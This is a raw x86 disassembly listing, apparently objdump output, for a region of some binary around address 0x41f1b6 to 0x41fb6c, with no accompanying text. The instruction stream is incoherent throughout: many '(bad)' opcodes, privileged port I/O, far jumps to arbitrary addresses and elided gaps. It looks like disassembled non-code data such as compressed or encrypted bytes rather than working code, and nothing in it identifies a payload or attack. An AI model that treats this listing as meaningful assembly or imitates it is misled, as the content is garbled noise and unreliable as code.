  41f1b6:	xor    eax,0xea47e5f8
  41f1bb:	dec    ebp
  41f1bc:	xchg   ebx,esi
  41f1be:	out    0xd9,eax
  41f1c0:	sbb    cl,BYTE PTR [ebx]
  41f1c2:	fs fs or eax,0xd5c3e700
  41f1c9:	les    esp,FWORD PTR [esi+0x3dfea192]
  41f1cf:	adc    BYTE PTR [eax],al
	...
  41f1ed:	add    BYTE PTR [edi+ecx*1+0x35],al
  41f1f1:	xor    al,0x6a
  41f1f3:	test   al,ch
  41f1f5:	add    ecx,DWORD PTR ds:0xfe02a080
  41f1fb:	shl    BYTE PTR [ecx+0x4c],0x24
  41f1ff:	aas    
  41f200:	fiadd  WORD PTR [esi+0x3e700db]
  41f206:	test   dl,al
  41f208:	fimul  WORD PTR [edx+0x44ea27be]
  41f20e:	or     al,0x30
  41f210:	mov    dl,0x41
  41f212:	mov    esp,0x1e9771fc
  41f217:	out    0x56,eax
  41f219:	add    esp,DWORD PTR [edx]
  41f21b:	mov    ah,bl
  41f21d:	inc    ebx
  41f21e:	xchg   esp,eax
  41f21f:	xchg   esp,eax
  41f220:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41f222:	xchg   ebp,eax
  41f223:	shr    esp,cl
  41f225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f226:	aad    0xcf
  41f228:	mov    bl,0xba
  41f22a:	lea    edi,[edi]
  41f22c:	jmp    0x3bd0bf0b
  41f231:	add    edx,DWORD PTR [eax+0xc]
  41f234:	loop   0x41f280
  41f236:	or     DWORD PTR [edx+0x10],0xffffffdf
  41f23a:	repz sbb edi,esp
  41f23d:	and    edx,0x4
  41f240:	fimul  WORD PTR [eax+0x3e6ff1b]
  41f246:	test   BYTE PTR [eax-0x3e],cl
  41f249:	inc    edx
  41f24a:	add    BYTE PTR [ecx+0x11c500],al
  41f250:	add    BYTE PTR [edx+0x0],ah
	...
  41f26f:	add    dl,cl
  41f271:	icebp  
  41f272:	mov    BYTE PTR [ecx+ebp*8],bh
  41f275:	(bad)  
  41f276:	mov    esi,0xc1d6feea
  41f27b:	pop    edx
  41f27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f27d:	mov    BYTE PTR [ebp-0xb],dh
  41f280:	mov    bh,0x29
  41f282:	add    DWORD PTR [eax+0x72bf8d89],edi
  41f288:	jne    0x41f2e3
  41f28a:	mov    ebp,edi
  41f28c:	adc    bh,dl
  41f28e:	das    
  41f28f:	xor    al,0x7e
  41f291:	add    al,0xed
  41f294:	push   edi
  41f295:	aas    
  41f296:	jb     0x41f226
  41f298:	bswap  ebx
  41f29a:	or     edx,edx
  41f29c:	xlat   BYTE PTR ds:[ebx]
  41f29d:	xchg   ecx,eax
  41f29e:	iret   
  41f29f:	cmp    bl,0xff
  41f2a2:	(bad)  
  41f2a3:	call   0x288744b3
  41f2a8:	mov    al,ds:0xecd0059
  41f2ad:	add    BYTE PTR [ecx+0x73fe52ee],al
  41f2b3:	repz adc DWORD PTR [ebp+0x45368afb],edi
  41f2ba:	inc    ecx
  41f2bb:	jmp    0x9ccaf8b7
  41f2c0:	add    al,BYTE PTR [ebp-0x7dbe17bc]
  41f2c6:	inc    ebx
  41f2c7:	cmp    eax,0x62ebbd87
  41f2cc:	fst    QWORD PTR [ebx+ecx*4]
  41f2cf:	popf   
  41f2d0:	or     DWORD PTR [ebx+ecx*4],ecx
  41f2d3:	pushf  
	...
  41f2f0:	add    BYTE PTR [eax],al
  41f2f2:	cmp    ch,BYTE PTR [eax]
  41f2f4:	ss in  al,0x9
  41f2f7:	add    BYTE PTR [ecx+ebp*1-0x16487be5],al
  41f2fe:	push   cs
  41f2ff:	add    BYTE PTR [ecx-0x1175700],cl
  41f305:	inc    esp
  41f306:	lock bound ecx,QWORD PTR [eax-0x419cebab]
  41f30d:	ret    0x62ac
  41f310:	xchg   BYTE PTR [eax],dl
  41f312:	dec    edx
  41f313:	xchg   DWORD PTR [ecx-0x1c],edx
  41f316:	dec    edx
  41f317:	mov    ebp,0x855a08c1
  41f31c:	push   eax
  41f31d:	add    cl,BYTE PTR [edx-0x79]
  41f320:	push   ecx
  41f321:	lock dec edx
  41f323:	mov    ebp,0x854a08c1
  41f328:	push   eax
  41f329:	add    al,0xda
  41f32b:	xchg   BYTE PTR [ecx-0xc],dl
  41f32e:	retf   0xc1bc
  41f331:	or     BYTE PTR [edx],cl
  41f333:	test   DWORD PTR [eax+0x6],edx
  41f336:	call   DWORD PTR [edx+0x4d]
  41f339:	mov    DWORD PTR [esp+ecx*1],esp
  41f33c:	jg     0x41f3bd
  41f33e:	add    BYTE PTR [ecx],al
  41f340:	mov    DWORD PTR [eax+0x60],ecx
  41f343:	jo     0x41f351
  41f345:	call   FWORD PTR [ecx-0x1c]
  41f348:	dec    esi
  41f349:	dec    DWORD PTR [ecx-0x48]
  41f34c:	dec    esp
  41f34d:	call   0x3cd2dd
  41f352:	fisttp WORD PTR [ebp+0xc]
  41f355:	mov    dh,0x0
	...
  41f373:	add    BYTE PTR [ebx+0x3d],ch
  41f376:	inc    ebp
  41f377:	je     0x41f375
  41f379:	dec    ebx
  41f37a:	jno    0x41f39c
  41f37c:	ins    BYTE PTR es:[edi],dx
  41f37d:	inc    esp
  41f37e:	jno    0x41f386
  41f380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f381:	pusha  
  41f382:	stc    
  41f383:	add    BYTE PTR [edi+0x1c75fc4d],bh
  41f389:	mov    DWORD PTR [ecx-0x2c],edx
  41f38c:	xor    ebp,DWORD PTR [edi-0xb]
  41f38f:	mov    ebp,DWORD PTR [ecx+0x4d8b52d3]
  41f395:	in     al,0x95
  41f397:	cli    
  41f398:	or     eax,0x35e91aee
  41f39d:	push   es
  41f39e:	xchg   ebp,eax
  41f39f:	xlat   BYTE PTR ds:[ebx]
  41f3a0:	xchg   BYTE PTR [ebp+esi*1-0x3],dh
  41f3a4:	pop    eax
  41f3a5:	add    DWORD PTR [edi-0x4b8722bd],eax
  41f3ab:	out    0x3b,eax
  41f3ad:	nop    ebp
  41f3b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b1:	sbb    bl,BYTE PTR [ebx+esi*2]
  41f3b4:	aad    0x92
  41f3b6:	mov    ch,0xd3
  41f3b8:	stos   BYTE PTR es:[edi],al
  41f3b9:	mov    ah,0x1b
  41f3bb:	mov    DWORD PTR [eax+0x59],ecx
  41f3be:	mov    dl,0x54
  41f3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3c2:	push   cs
  41f3c3:	std    
  41f3c4:	xchg   edx,eax
  41f3c5:	nop
  41f3c6:	(bad)  
  41f3c9:	imul   edx,DWORD PTR [ebp+0x2ff4960a],0x8e4cd0fd
  41f3d3:	inc    esp
  41f3d4:	or     al,0x25
  41f3d6:	mov    al,BYTE PTR [ebx+0x0]
	...
  41f3f5:	add    BYTE PTR [ecx-0x5e],bh
  41f3f8:	(bad)
  41f3fb:	fsub   QWORD PTR [edi]
  41f3fd:	mov    eax,ecx
  41f3ff:	or     al,0x88
  41f401:	pop    ebx
  41f402:	inc    ecx
  41f403:	jo     0x41f471
  41f405:	sti    
  41f406:	dec    edx
  41f407:	mov    es,WORD PTR [edi-0x49d5d2ad]
  41f40d:	out    dx,eax
  41f40e:	and    al,0x40
  41f410:	push   ds
  41f411:	std    
  41f412:	xor    bl,BYTE PTR [edi+esi*1-0xbcef8d]
  41f419:	pop    ebp
  41f41a:	ss lock into 
  41f41d:	mov    edi,0xbc58fb3
  41f422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f423:	sbb    al,0x8e
  41f425:	inc    ebx
  41f426:	sbb    DWORD PTR [ecx+0x1c],edi
  41f429:	jae    0x41f440
  41f42b:	aas    
  41f42c:	inc    edx
  41f42d:	rol    DWORD PTR ds:0x568a8d00,0x6
  41f434:	bsr    eax,DWORD PTR [ecx-0x3278e9ea]
  41f43b:	mov    esi,ebp
  41f43d:	sbb    al,0x5e
  41f43f:	and    al,0x6
  41f441:	xchg   esi,eax
  41f442:	mov    dh,0x16
  41f444:	je     0x41f451
  41f446:	mov    ch,0xc3
  41f448:	pop    ebp
  41f449:	sbb    al,0xc0
  41f44b:	jnp    0x41f474
  41f44d:	xchg   edi,eax
  41f44e:	psrlq  mm3,mm4
  41f451:	ret    0x1a5
  41f454:	sbb    dl,BYTE PTR [edx]
  41f456:	test   al,0x8c
  41f458:	mov    dl,0x2c
	...
  41f476:	add    BYTE PTR [eax],al
  41f478:	sar    bl,cl
  41f47a:	out    0x3,eax
  41f47c:	test   BYTE PTR ds:0x3fdc06d2,bh
  41f482:	push   ds
  41f483:	mov    edx,0xca948e5
  41f488:	or     eax,0x112f9fd2
  41f48d:	xor    DWORD PTR [edi-0x17984de6],ecx
  41f493:	(bad)  
  41f494:	bound  ecx,QWORD PTR [edx-0x61f11fc5]
  41f49a:	pop    edi
  41f49b:	push   es
  41f49c:	test   BYTE PTR [ebx+0x7850bca],bh
  41f4a2:	test   eax,0x61ad0d0c
  41f4a7:	sub    BYTE PTR [ebx+eiz*1-0x511f4925],cl
  41f4ae:	sar    BYTE PTR [ebx-0x2ea1f85c],1
  41f4b4:	inc    edx
  41f4b5:	sub    eax,0x179403aa
  41f4ba:	bound  edi,QWORD PTR ds:0xf50aec18
  41f4c0:	sar    bh,cl
  41f4c2:	jno    0x41f4d8
  41f4c4:	mov    cs,WORD PTR [esi]
  41f4c6:	add    dh,ah
  41f4c8:	and    BYTE PTR [esi+edi*8+0x7b7f0ee8],0xf1
  41f4d0:	push   cs
  41f4d1:	jge    0x41f4f1
  41f4d3:	xchg   DWORD PTR [ebx-0x309f9a05],ebx
  41f4d9:	std    
  41f4da:	or     al,0x56
	...
  41f4f8:	add    BYTE PTR [eax],al
  41f4fa:	into   
  41f4fb:	add    esi,eax
  41f4fd:	lods   al,BYTE PTR ds:[esi]
  41f4fe:	idiv   edi
  41f500:	gs jo  0x41f4d2
  41f503:	pop    es
  41f504:	or     eax,0xfd16ca6d
  41f509:	jmp    0xf1904015
  41f50e:	jle    0x41f4d6
  41f510:	push   eax
  41f511:	ficomp WORD PTR [ebp+0x9291021]
  41f517:	add    eax,0x67c59855
  41f51d:	adc    DWORD PTR [eax],ecx
  41f51f:	add    BYTE PTR [eax],al
  41f521:	mov    esi,0x2f8afd9d
  41f526:	jge    0x41f4ed
  41f528:	mov    ah,BYTE PTR [ecx+ecx*1]
  41f52b:	mov    al,0x50
  41f52d:	xchg   ecx,eax
  41f52e:	pop    es
  41f52f:	inc    edi
  41f530:	std    
  41f531:	sahf   
  41f532:	cmp    eax,DWORD PTR [edx]
  41f534:	xor    DWORD PTR [ecx+0x640fbe91],ebp
  41f53a:	into   
  41f53b:	add    al,BYTE PTR [ebp+esi*8+0x72000009]
  41f542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f543:	std    
  41f544:	bound  ecx,QWORD PTR gs:[edi+0x3]
  41f548:	or     eax,0x65fd4436
  41f54d:	sub    dh,ah
  41f54f:	inc    BYTE PTR [edi-0x49fbc159]
  41f555:	sub    DWORD PTR [edi],edx
  41f557:	arpl   WORD PTR [edi-0x57f6b3a0],di
	...
  41f579:	add    BYTE PTR [eax],al
  41f57b:	add    BYTE PTR [edi],ah
  41f57d:	test   DWORD PTR [ebx],eax
  41f57f:	adc    DWORD PTR [ebp+ebp*8+0x7e],0xffffffc0
  41f584:	lock add DWORD PTR [esi+0xc],0x6e
  41f589:	inc    edx
  41f58a:	or     ecx,DWORD PTR [ebp+0x38520ca]
  41f590:	pop    esi
  41f591:	inc    edx
  41f592:	or     ecx,DWORD PTR [eax+0x46c31bb2]
  41f598:	mov    BYTE PTR [eax],0x66
  41f59b:	or     DWORD PTR [ebx+0x610f0806],0xffffffc1
  41f5a2:	xchg   DWORD PTR [esi-0x29],eax
  41f5a5:	sub    al,0xfe
  41f5a7:	je     0x41f537
  41f5a9:	or     DWORD PTR [ebx-0x78445b9],esi
  41f5af:	adc    BYTE PTR [ecx+0xf],al
  41f5b2:	les    eax,FWORD PTR [ebp-0x54]
  41f5b5:	add    BYTE PTR [eax+eax*1-0x5c],bh
  41f5b9:	mov    edi,0xfac4f840
  41f5be:	(bad)  
  41f5bf:	push   DWORD PTR [ebx+0x741ff154]
  41f5c5:	add    BYTE PTR [eax],al
  41f5c7:	jmp    0x41f627
  41f5c9:	jnp    0x41f5c3
  41f5cb:	and    BYTE PTR [ecx],dl
  41f5cd:	and    eax,0x5c45c4
  41f5d2:	add    bh,bh
  41f5d4:	je     0x41f595
  41f5d6:	inc    eax
  41f5d7:	clc    
  41f5d8:	fs idiv edi
  41f5db:	jmp    DWORD PTR [ebx+0xfff154]
	...
  41f5fd:	add    BYTE PTR [eax+eax*1],dh
  41f600:	add    BYTE PTR [ebp-0x72b2da0e],cl
  41f606:	repnz pop ds
  41f608:	dec    ebp
  41f609:	mov    esp,DWORD PTR [ecx+0x8]
  41f60c:	call   0xfb38c0e5
  41f611:	lea    ecx,ds:0x884fec65
  41f617:	pop    esp
  41f618:	fisttp WORD PTR [edi-0x7a]
  41f61b:	arpl   WORD PTR [ecx],bx
  41f61d:	call   0xfd58c9f3
  41f622:	nop
  41f623:	arpl   bp,sp
  41f625:	dec    edi
  41f626:	mov    BYTE PTR [ebx-0x17],bl
  41f629:	dec    edi
  41f62a:	xchg   BYTE PTR [ebp+ecx*1-0x18],ah
  41f62e:	mov    eax,ds:0x77fd16f3
  41f633:	sbb    DWORD PTR [edx+ecx*4-0x184ec7ad],esi
  41f63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f63b:	add    al,BYTE PTR es:[eax]
  41f63e:	xchg   edi,eax
  41f63f:	pop    ebx
  41f640:	rol    DWORD PTR [edi-0x4af797b5],1
  41f646:	push   ebx
  41f647:	pop    ds
  41f648:	or     BYTE PTR [ebp+0x463f0d4b],ch
  41f64e:	loope  0x41f677
  41f650:	jle    0x41f612
  41f652:	sbb    DWORD PTR [ecx+ebp*1],esp
  41f655:	push   ds
  41f656:	push   cs
  41f657:	sub    BYTE PTR [ecx],al
  41f659:	xchg   DWORD PTR [ebx+0x21],ecx
  41f65c:	jle    0x41f61e
  41f65e:	add    DWORD PTR [ebx],ebp
  41f660:	sbb    BYTE PTR [esi+0x0],dh
	...
  41f67f:	add    BYTE PTR ds:0x20fccf4a,bl
  41f685:	cdq    
  41f686:	lock aas 
  41f688:	or     eax,0x9003be90
  41f68d:	imul   ecx,DWORD PTR [ebp+0x16e44b03],0xe780c3ff
  41f697:	add    BYTE PTR [ecx+ebp*1],cl
  41f69a:	cmp    DWORD PTR [ebx+0x4a],0x420e8e29
  41f6a1:	adc    esi,ecx
  41f6a3:	cld    
  41f6a4:	and    BYTE PTR [ebp+0xd3ff1],al
  41f6aa:	mov    ebp,0xe7ff022b
  41f6af:	add    ebx,esp
  41f6b1:	or     DWORD PTR [edx+0x41],esp
  41f6b4:	mov    eax,0x4f4ab1b1
  41f6b9:	cld    
  41f6ba:	out    0x18,al
  41f6bc:	cmp    esp,0x3d
  41f6bf:	rol    DWORD PTR [ecx],1
  41f6c1:	in     eax,dx
  41f6c2:	jbe    0x41f6b7
  41f6c4:	cmp    al,BYTE PTR [eax]
  41f6c6:	cs xchg ecx,eax
  41f6c8:	add    dl,BYTE PTR [ebx]
  41f6ca:	cld    
  41f6cb:	aaa    
  41f6cc:	std    
  41f6cd:	mov    edi,0xf45b18e6
  41f6d2:	(bad)  
  41f6d3:	adc    al,0xf
  41f6d5:	add    edi,esp
  41f6d7:	sbb    BYTE PTR [ebx-0x8],bl
  41f6da:	push   cs
  41f6db:	sub    eax,0x18e7010f
  41f6e0:	cmp    edi,DWORD PTR [esi+edi*8+0x24]
	...
  41f6ff:	add    BYTE PTR [eax],al
  41f701:	add    BYTE PTR [edi],cl
  41f703:	add    edi,esp
  41f705:	mov    cl,0xaa
  41f707:	xor    ebp,ecx
  41f709:	add    al,0xd
  41f70b:	aas    
  41f70c:	xor    al,0x8b
  41f70e:	mov    cl,0xb0
  41f710:	cmp    al,0x17
  41f712:	push   ds
  41f713:	add    al,0xce
  41f715:	icebp  
  41f716:	into   
  41f717:	in     eax,dx
  41f718:	es add al,0x94
  41f71b:	(bad)  
  41f71d:	add    al,0xd
  41f71f:	adc    esp,edi
  41f721:	mov    cl,BYTE PTR [ebx+0x40]
  41f724:	shl    ah,0x5
  41f727:	inc    ecx
  41f728:	jb     0x41f770
  41f72a:	jmp    0x6200:0xd16e720
  41f731:	cs call 0x8f40:0x470af71d
  41f739:	or     al,0x8a
  41f73b:	and    bh,ch
  41f73d:	or     al,BYTE PTR [edx+0x152c0088]
  41f743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f744:	add    ebx,DWORD PTR [esp+ecx*2+0x16]
  41f748:	push   eax
  41f749:	data16 jl 0x41f746
  41f74c:	out    0x5e,eax
  41f74e:	popf   
  41f74f:	adc    al,0xfd
  41f751:	ins    DWORD PTR es:[edi],dx
  41f752:	ror    DWORD PTR [ebx-0x73fc9be9],1
  41f758:	setg   BYTE PTR [ebx]
  41f75b:	lea    ecx,[ebx]
  41f75d:	ds pushf 
  41f75f:	stc    
  41f760:	out    0x42,eax
  41f762:	jge    0x41f777
  41f764:	std    
  41f765:	add    BYTE PTR gs:[eax],al
	...
  41f784:	dec    ecx
  41f785:	mov    WORD PTR [ebx],es
  41f787:	pop    ecx
  41f788:	adc    BYTE PTR [edi],ah
  41f78a:	add    bl,bl
  41f78c:	dec    esi
  41f78d:	mov    dl,0xc6
  41f78f:	sub    ecx,DWORD PTR [ecx]
  41f791:	add    BYTE PTR [ebx+0x62],dl
  41f794:	and    eax,0xc85eb91
  41f799:	add    BYTE PTR [eax],al
  41f79b:	call   0x886b:0x9f0bb597
  41f7a2:	jnp    0x41f785
  41f7a4:	fs add eax,0xd19bed68
  41f7aa:	push   DWORD PTR ds:0xd69454f1
  41f7b0:	add    edi,DWORD PTR [eax+eax*8-0x22]
  41f7b4:	adc    dl,BYTE PTR [ebx]
  41f7b6:	add    eax,0x3fa80ee9
  41f7bb:	xchg   BYTE PTR ss:[ecx],dl
  41f7be:	addr16 in eax,0x85
  41f7c1:	mov    ebp,0x1b2119c7
  41f7c6:	xchg   ecx,eax
  41f7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7c8:	add    edi,DWORD PTR [eax+eax*8-0x12]
  41f7cc:	loop   0x41f7e8
  41f7ce:	add    eax,0x3a60ee9
  41f7d3:	xor    DWORD PTR [ecx+0x7c004b86],ebx
  41f7d9:	dec    esp
  41f7da:	mov    dh,0x14
  41f7dc:	cmp    edi,DWORD PTR ds:0xda87e7fd
  41f7e2:	(bad)  
  41f7e3:	jmp    FWORD PTR [ecx+0x850abc]
	...
  41f805:	add    cl,ah
  41f807:	adc    ebp,edi
  41f809:	call   FWORD PTR [edi+edi*1-0x31967734]
  41f810:	mov    BYTE PTR [ebp-0x3d],bh
  41f813:	xchg   DWORD PTR [ecx-0x34],eax
  41f816:	pop    esp
  41f817:	mov    esi,0x87f40002
  41f81c:	jns    0x41f803
  41f81e:	jno    0x41f860
  41f820:	int    0xe8
  41f822:	jl     0x41f836
  41f824:	std    
  41f825:	jmp    ebx
  41f827:	ret    0xe540
  41f82a:	repz ret 0xff48
  41f82e:	mov    bh,BYTE PTR [ebx+0x58a08df]
  41f834:	mov    ebp,0xbd0b0f
  41f839:	std    
  41f83a:	shr    dl,0xfa
  41f83d:	mov    ecx,0xfffffda4
  41f842:	mov    dh,BYTE PTR ds:0x883b0fbe
  41f848:	add    eax,DWORD PTR [eax]
  41f84a:	mov    ah,0x87
  41f84c:	pop    es
  41f84d:	or     DWORD PTR [ecx-0x1c],0xffffffff
  41f851:	xor    al,bl
  41f853:	js     0x41f896
  41f855:	call   0x55cc4495
  41f85a:	push   eax
  41f85b:	test   BYTE PTR [ecx-0x14],bh
  41f85e:	ret    
  41f85f:	dec    esi
  41f860:	add    DWORD PTR [ebx-0x377917d7],ecx
  41f866:	(bad)  
  41f868:	mov    esp,0xea
	...
  41f885:	add    BYTE PTR [eax],al
  41f887:	add    BYTE PTR [ebp+edi*2-0x23],ah
  41f88b:	add    BYTE PTR ds:0x6001427,cl
  41f891:	pop    ebp
  41f892:	xchg   eax,edx
  41f894:	mov    esp,DWORD PTR [esi]
  41f896:	adc    al,0x0
  41f898:	or     eax,0x2dbf2b46
  41f89d:	ss or  al,dl
  41f8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a1:	sbb    al,BYTE PTR [esi+0x28e72d43]
  41f8a7:	or     BYTE PTR [esp+eax*8+0xb],cl
  41f8ab:	push   eax
  41f8ac:	sbb    dh,BYTE PTR [ebx]
  41f8ae:	or     DWORD PTR [ecx],ecx
  41f8b0:	inc    edi
  41f8b1:	lahf   
  41f8b2:	(bad)  
  41f8b3:	fcomip st,st(5)
  41f8b5:	retf   0xfd6e
  41f8b8:	add    ah,BYTE PTR [esi-0x65ee8cbd]
  41f8be:	(bad)  
  41f8bf:	jmp    0x41f8b3
  41f8c1:	mov    ds:0xf18eebbc,al
  41f8c6:	add    ecx,DWORD PTR ds:0xfffc0f89
  41f8cc:	fisub  DWORD PTR [ecx+0x4]
  41f8cf:	sub    DWORD PTR [edi],0x26
  41f8d2:	add    DWORD PTR [eax],eax
  41f8d4:	xor    eax,0xd188c59
  41f8d9:	jbe    0x41f863
  41f8db:	jnp    0x41f8e2
  41f8dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8de:	mov    esp,0xc015dfc
  41f8e3:	xchg   ecx,eax
  41f8e4:	stos   BYTE PTR es:[edi],al
  41f8e5:	es jge 0x41f8a8
  41f8e8:	adc    ah,BYTE PTR [ebp+0x508]
	...
  41f90a:	or     eax,0x927b8119
  41f90f:	sbb    DWORD PTR [eax+0x3eac1a09],ecx
  41f915:	std    
  41f916:	ficom  WORD PTR [eax]
  41f918:	jge    0x41f8da
  41f91a:	or     bl,BYTE PTR [ebp+0x190d060c]
  41f920:	mov    BYTE PTR [ecx],cl
  41f922:	mov    es,WORD PTR [eax]
  41f924:	or     al,0x24
  41f926:	or     eax,0xbd8c247d
  41f92b:	jl     0x41f969
  41f92d:	and    al,0x50
  41f92f:	mov    bl,0xda
  41f931:	mov    BYTE PTR [ebp-0x7b],dl
  41f934:	mov    al,0x4
  41f936:	mov    DWORD PTR [edx],ebp
  41f938:	in     eax,0x3
  41f93a:	or     eax,0x87f3fc0f
  41f93f:	lds    ebx,FWORD PTR [esi+0x2b]
  41f942:	sahf   
  41f943:	or     esp,DWORD PTR [esi+0x14]
  41f946:	xchg   esp,eax
  41f947:	sub    BYTE PTR [eax+edi*1+0x8],ah
  41f94b:	test   BYTE PTR [edi*8-0x71b1f0ee],ch
  41f952:	jmp    0xe6c0:0x1f3fdc0e
  41f959:	add    al,0xc3
  41f95b:	mov    edx,0xa5f588df
  41f960:	popa   
  41f961:	rcl    BYTE PTR [edx],0xa6
  41f964:	daa    
  41f965:	and    edx,DWORD PTR ds:0x7342f1a6
  41f96b:	jns    0x41f919
  41f96d:	ja     0x41f96f
	...
  41f98b:	add    BYTE PTR [ebx+0x7b],ch
  41f98e:	stos   BYTE PTR es:[edi],al
  41f98f:	or     DWORD PTR [eax],ebx
  41f991:	push   esi
  41f992:	mov    dl,0x8
  41f994:	sub    eax,DWORD PTR [ecx+0x7]
  41f997:	or     esi,DWORD PTR [ebx]
  41f999:	sti    
  41f99a:	daa    
  41f99b:	popf   
  41f99c:	mov    eax,esp
  41f99e:	dec    esp
  41f99f:	mov    al,dl
  41f9a1:	in     al,0xe6
  41f9a3:	add    esp,DWORD PTR [eax+0x5a4371ff]
  41f9a9:	sbb    bh,dh
  41f9ab:	(bad)  
  41f9ac:	push   ebx
  41f9ad:	jp     0x41f94d
  41f9af:	inc    ebp
  41f9b0:	push   0xffffffef
  41f9b2:	jno    0x41f9ef
  41f9b4:	sub    al,0x36
  41f9b6:	repnz cmp eax,0xe10017ba
  41f9bc:	leave  
  41f9bd:	cs or  dl,ah
  41f9c0:	rol    DWORD PTR [esi-0x17ca6bd],1
  41f9c6:	mov    ch,BYTE PTR [edx]
  41f9c8:	jno    0x41f988
  41f9ca:	mov    ch,BYTE PTR [ecx+ebp*8]
  41f9cd:	scas   eax,DWORD PTR es:[edi]
  41f9ce:	out    0x82,eax
  41f9d0:	adc    DWORD PTR [edi],ecx
  41f9d2:	std    
  41f9d3:	bswap  eax
  41f9d5:	ret    0xf1a3
  41f9d8:	fs dec ebp
  41f9da:	inc    ebx
  41f9db:	dec    edi
  41f9dc:	xor    DWORD PTR [esi+edi*4+0x69f7c924],esp
  41f9e3:	add    DWORD PTR [edx+eax*8-0x6d004665],ecx
  41f9ea:	pop    es
  41f9eb:	inc    ecx
  41f9ec:	add    esi,DWORD PTR [edx-0x3]
  41f9ef:	dec    esi
	...
  41fa0c:	add    BYTE PTR [eax],al
  41fa0e:	xchg   ebp,eax
  41fa0f:	inc    eax
  41fa10:	or     eax,0x3e16d
  41fa15:	jmp    0xddb6059f
  41fa1a:	mov    bh,0xc
  41fa1c:	jae    0x41fa67
  41fa1e:	(bad)  
  41fa1f:	nop
  41fa20:	pop    es
  41fa21:	adc    DWORD PTR [ebx],ebp
  41fa23:	jb     0x41fa22
  41fa25:	push   ds
  41fa26:	test   DWORD PTR [eax+0xd],eax
  41fa29:	ins    DWORD PTR es:[edi],dx
  41fa2a:	fld    DWORD PTR [ebx]
  41fa2c:	add    cl,ch
  41fa2e:	dec    ebx
  41fa2f:	leave  
  41fa30:	dec    edi
  41fa31:	(bad)  
  41fa33:	or     eax,0x1ffeb5
  41fa38:	add    BYTE PTR [edi],dh
  41fa3a:	push   ds
  41fa3b:	add    BYTE PTR [eax],al
  41fa3d:	jmp    0x4f98326d
  41fa42:	and    cl,al
  41fa44:	fsubr  DWORD PTR [ebp+eax*4+0x78]
  41fa48:	(bad)  
  41fa49:	(bad)  
  41fa4a:	call   FWORD PTR [ecx-0x3f28c701]
  41fa50:	xlat   BYTE PTR ds:[ebx]
  41fa51:	add    BYTE PTR [edi+edx*2-0x7a],dh
  41fa55:	dec    ebp
  41fa56:	lods   eax,DWORD PTR ds:[esi]
  41fa57:	repnz rcl BYTE PTR [esi+0x77],cl
  41fa5b:	out    0x88,eax
  41fa5d:	test   esp,ebp
  41fa5f:	out    dx,eax
  41fa60:	cli    
  41fa61:	jmp    DWORD PTR [edx]
  41fa63:	push   esp
  41fa64:	cld    
  41fa65:	xlat   BYTE PTR ds:[ebx]
  41fa66:	out    0xc4,eax
  41fa68:	pop    ss
  41fa69:	mov    ecx,esi
  41fa6b:	sti    
  41fa6c:	test   BYTE PTR [ebp-0x38],dh
  41fa6f:	test   DWORD PTR [ecx-0x8],edi
	...
  41fa8e:	add    BYTE PTR [eax],al
  41fa90:	xor    al,0x2
  41fa92:	xchg   cl,bl
  41fa94:	and    al,0x1
  41fa96:	add    BYTE PTR [edx+0x24],ch
  41fa99:	imul   ebp,DWORD PTR [ecx],0x89013401
  41fa9f:	inc    ebp
  41faa0:	sbb    al,0x51
  41faa2:	xor    al,al
  41faa4:	mov    esp,0xbbff93ad
  41faa9:	test   eax,edi
  41faab:	(bad)  
  41faac:	jmp    0x41fb25
  41faae:	mov    esi,0xfb00f400
  41fab3:	adc    eax,0x3d0828
  41fab8:	stc    
  41fab9:	dec    esp
  41faba:	and    al,0x0
  41fabc:	hlt    
  41fabd:	add    DWORD PTR [ecx+0xf189],eax
  41fac3:	cmp    DWORD PTR [ecx+0x14],0xfffffffd
  41fac7:	jae    0x41fab8
  41fac9:	push   0xfffffffc
  41facb:	jmp    DWORD PTR [ecx-0x57ea03ec]
  41fad1:	adc    eax,0x383f003d
  41fad6:	or     DWORD PTR [ebx+0x104ff1ac],ecx
  41fadc:	das    
  41fadd:	jo     0x41fad4
  41fadf:	adc    DWORD PTR [ecx+0x14],0xfffffffd
  41fae3:	test   BYTE PTR [ebx+0xd836e67],bh
  41fae9:	mov    esp,0x3df6001b
  41faee:	stc    
  41faef:	mov    al,cl
  41faf1:	xor    bh,BYTE PTR [ebx+0x4b]
	...
  41fb10:	add    BYTE PTR [eax],al
  41fb12:	gs fwait
  41fb14:	xlat   BYTE PTR ds:[ebx]
  41fb15:	(bad)  
  41fb16:	call   0xd448cb4
  41fb1b:	aad    0xba
  41fb1d:	gs mov fs,esp
  41fb20:	push   es
  41fb21:	add    bl,ah
  41fb23:	loop   0x41fade
  41fb25:	cld    
  41fb26:	fcomp  DWORD PTR [esi]
  41fb28:	jl     0x41faeb
  41fb2a:	xor    eax,0x42fd169d
  41fb2f:	cdq    
  41fb30:	or     edi,ebp
  41fb32:	or     ah,BYTE PTR [ebx+0x170d02ea]
  41fb38:	xchg   al,al
  41fb3a:	sbb    ah,BYTE PTR [ebx+0x170d02f2]
  41fb40:	test   al,bh
  41fb42:	or     al,0x34
  41fb44:	in     al,0x88
  41fb46:	enter  0xc106,0x38
  41fb4a:	push   eax
  41fb4b:	mov    cl,0x94
  41fb4d:	adc    DWORD PTR [edx],eax
  41fb4f:	push   ebp
  41fb50:	or     DWORD PTR [ecx-0x3283ef16],eax
  41fb56:	or     BYTE PTR [ebp+ebx*1-0x18],0xab
  41fb5b:	fild   DWORD PTR [ebx]
  41fb5d:	add    dh,dh
  41fb5f:	adc    DWORD PTR [ebx-0x650ebcfa],ebx
  41fb65:	dec    DWORD PTR ds:0x1d431019
  41fb6b:	sahf   
  41fb6c:	les    ecx,FWORD PTR [edi]
